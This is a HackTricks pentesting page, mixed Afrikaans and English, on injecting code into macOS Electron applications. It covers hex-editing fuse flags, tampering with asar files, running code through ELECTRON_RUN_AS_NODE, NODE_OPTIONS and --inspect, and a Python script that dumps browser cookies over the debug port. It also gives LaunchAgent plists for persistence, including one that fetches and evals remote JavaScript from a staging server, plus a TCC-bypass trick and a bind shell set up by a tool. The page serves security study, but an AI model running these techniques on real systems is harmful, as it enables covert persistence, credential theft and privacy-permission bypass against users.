# macOS Electron Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

As jy nie weet wat Electron is nie, kan jy [**baie inligting hier vind**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Maar vir nou moet jy net weet dat Electron **node** draai.\
En node het 'n paar **parameters** en **omgewing veranderlikes** wat gebruik kan word om **ander kode uit te voer** behalwe die aangeduide lêer.

### Electron Fuses

Hierdie tegnieke sal volgende bespreek word, maar in onlangse tye het Electron verskeie **veiligheidsvlaggies bygevoeg om dit te voorkom**. Dit is die [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) en dit is diegene wat gebruik word om **te voorkom** dat Electron-apps in macOS **arbitraire kode laai**:

* **`RunAsNode`**: As dit gedeaktiveer is, voorkom dit die gebruik van die omgewing veranderlike **`ELECTRON_RUN_AS_NODE`** om kode in te spuit.
* **`EnableNodeCliInspectArguments`**: As dit gedeaktiveer is, sal parameters soos `--inspect`, `--inspect-brk` nie gerespekteer word nie. Dit vermy hierdie manier om kode in te spuit.
* **`EnableEmbeddedAsarIntegrityValidation`**: As dit geaktiveer is, sal die gelaaide **`asar`** **lêer** deur macOS **gevalideer** word. **Dit voorkom** op hierdie manier **kode-inspuiting** deur die inhoud van hierdie lêer te wysig.
* **`OnlyLoadAppFromAsar`**: As dit geaktiveer is, sal dit slegs app.asar nagaan en gebruik, in plaas daarvan om in die volgende volgorde te soek: **`app.asar`**, **`app`** en uiteindelik **`default_app.asar`**. Dit verseker dat wanneer dit **gekombineer** word met die **`embeddedAsarIntegrityValidation`** fuse, dit **onmoontlik** is om **nie-gevalideerde kode** te **laai**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: As dit geaktiveer is, gebruik die blaaiersproses die lêer genaamd `browser_v8_context_snapshot.bin` vir sy V8-snapshot.

Nog 'n interessante fuse wat nie kode-inspuiting sal voorkom nie, is:

* **EnableCookieEncryption**: As dit geaktiveer is, word die koekie-opslag op skyf geënkripteer met behulp van OS-vlak kriptografie sleutels.

### Checking Electron Fuses

Jy kan **hierdie vlaggies nagaan** vanaf 'n toepassing met:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Soos die [**dokumentasie noem**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), is die konfigurasie van die **Electron Fuses** geconfigureer binne die **Electron binêre** wat êrens die string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** bevat.

In macOS toepassings is dit tipies in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
You could load this file in [https://hexed.it/](https://hexed.it/) and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Note that if you try to **overwrite** the **`Electron Framework` binary** inside an application with these bytes modified, the app won't run.

## RCE adding code to Electron Applications

There could be **external JS/HTML files** that an Electron App is using, so an attacker could inject code in these files whose signature won't be checked and execute arbitrary code in the context of the app.

{% hint style="danger" %}
However, at the moment there are 2 limitations:

* The **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
* The compiled **`asap`** file usually has the fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** `enabled`

Making this attack path more complicated (or impossible).
{% endhint %}

Note that it's possible to bypass the requirement of **`kTCCServiceSystemPolicyAppBundles`** by copying the application to another directory (like **`/tmp`**), renaming the folder **`app.app/Contents`** to **`app.app/NotCon`**, **modifying** the **asar** file with your **malicious** code, renaming it back to **`app.app/Contents`** and executing it.

You can unpack the code from the asar file with:
```bash
npx asar extract app.asar app-decomp
```
En pak dit weer in nadat dit met die volgende gewysig is:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE met `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Volgens [**die dokumentasie**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), as hierdie omgewing veranderlike gestel is, sal dit die proses as 'n normale Node.js-proses begin.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
As die fuse **`RunAsNode`** gedeaktiveer is, sal die omgewing veranderlike **`ELECTRON_RUN_AS_NODE`** geïgnoreer word, en dit sal nie werk nie.
{% endhint %}

### Inspuiting vanaf die App Plist

Soos [**hier voorgestel**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kan jy hierdie omgewing veranderlike in 'n plist misbruik om volharding te handhaaf:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE met `NODE_OPTIONS`

Jy kan die payload in 'n ander lêer stoor en dit uitvoer:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
As die fuse **`EnableNodeOptionsEnvironmentVariable`** is **deaktiveer**, sal die app die env var **NODE\_OPTIONS** **ignore** wanneer dit gelaai word, tensy die env variable **`ELECTRON_RUN_AS_NODE`** gestel is, wat ook **geignore** sal word as die fuse **`RunAsNode`** deaktiveer is.

As jy nie **`ELECTRON_RUN_AS_NODE`** stel nie, sal jy die **fout** vind: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Inspuiting vanaf die App Plist

Jy kan hierdie env variable in 'n plist misbruik om volharding te handhaaf deur hierdie sleutels by te voeg:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE met inspeksie

Volgens [**hierdie**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), as jy 'n Electron-toepassing uitvoer met vlae soos **`--inspect`**, **`--inspect-brk`** en **`--remote-debugging-port`**, sal 'n **debug-poort oop wees** sodat jy daarop kan aansluit (byvoorbeeld vanaf Chrome in `chrome://inspect`) en jy sal in staat wees om **kode daarop in te spuit** of selfs nuwe prosesse te begin.\
Byvoorbeeld: 

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
As die fuse **`EnableNodeCliInspectArguments`** gedeaktiveer is, sal die app **node parameters** (soos `--inspect`) ignoreer wanneer dit gelaai word, tensy die omgewing veranderlike **`ELECTRON_RUN_AS_NODE`** gestel is, wat ook **geignoreer** sal word as die fuse **`RunAsNode`** gedeaktiveer is.

Tog kan jy steeds die **electron param `--remote-debugging-port=9229`** gebruik, maar die vorige payload sal nie werk om ander prosesse uit te voer nie.
{% endhint %}

Deur die param **`--remote-debugging-port=9222`** te gebruik, is dit moontlik om sekere inligting van die Electron App te steel, soos die **geskiedenis** (met GET-opdragte) of die **koekies** van die blaaier (aangesien hulle **ontsleuteld** binne die blaaiers is en daar 'n **json eindpunt** is wat hulle sal gee).

Jy kan leer hoe om dit te doen in [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) en [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) en die outomatiese hulpmiddel [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) of 'n eenvoudige skrip soos:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**hierdie blogpos**](https://hackerone.com/reports/1274695), word hierdie foutopsporing misbruik om 'n headless chrome **arbitraire lêers in arbitraire plekke af te laai**.

### Inspuiting vanaf die App Plist

Jy kan hierdie omgewing veranderlike in 'n plist misbruik om volharding te handhaaf deur hierdie sleutels by te voeg:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

{% hint style="success" %}
Die TCC daemon van macOS kontroleer nie die uitgevoerde weergawe van die toepassing nie. So as jy **nie kode in 'n Electron-toepassing kan inspuit nie** met enige van die vorige tegnieke, kan jy 'n vorige weergawe van die APP aflaai en kode daarop inspuit, aangesien dit steeds die TCC voorregte sal ontvang (tenzij Trust Cache dit voorkom).
{% endhint %}

## Run non JS Code

Die vorige tegnieke sal jou toelaat om **JS kode binne die proses van die electron toepassing** te loop. Onthou egter dat die **kind prosesse onder dieselfde sandbox profiel** as die ouer toepassing loop en **hulle TCC toestemmings erf**.\
Daarom, as jy voorregte wil misbruik om toegang tot die kamera of mikrofoon te verkry, kan jy eenvoudig **'n ander binêre vanaf die proses uitvoer**.

## Automatic Injection

Die hulpmiddel [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kan maklik gebruik word om **kwesbare electron toepassings** te vind wat geïnstalleer is en kode daarop in te spuit. Hierdie hulpmiddel sal probeer om die **`--inspect`** tegniek te gebruik:

Jy moet dit self saamstel en kan dit soos volg gebruik:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Verwysings

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
